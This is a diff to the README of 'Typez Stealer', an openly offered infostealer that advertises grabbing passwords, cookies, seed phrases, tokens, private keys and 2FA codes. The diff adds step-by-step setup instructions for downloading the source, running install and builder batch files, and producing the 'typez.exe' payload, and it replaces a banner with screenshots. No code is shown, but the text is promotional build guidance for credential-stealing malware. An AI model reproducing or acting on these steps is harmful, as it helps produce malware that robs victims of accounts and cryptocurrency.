@@ -61,9 +61,20 @@ Typez Stealer is a stealer that has many features, it can steal pws, cookies etc
   - Grabs Seed Phrases, Tokens, Private Keys, Recovery Codes, Backup Codes, 2FA codes
 
 ---
+                                                      ⬇️ Setup
+
+1. [Download source code zip](https://github.com/ChildsOfYhwh/Typez-Stealer/archive/refs/heads/main.zip)
+2. Extract zip
+3. First install reqiured packages by double clicking `install.bat` file
+4. Run the builder by double clicking the `builder.bat` file
+5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `typez.exe`
+---
                                                                  🖼️ Pictures
 
-![image](https://i.postimg.cc/26pfK0WF/banner-typez-stealer.png)
+![image](https://i.postimg.cc/CxwbTxhg/overlay.png)
+![image](https://i.postimg.cc/4yLRf3DS/1.png)
+![image](https://i.postimg.cc/ZKnhfr3t/2.png)
+![image](https://i.postimg.cc/44Bgb8YQ/3.png)
 
 ---
 
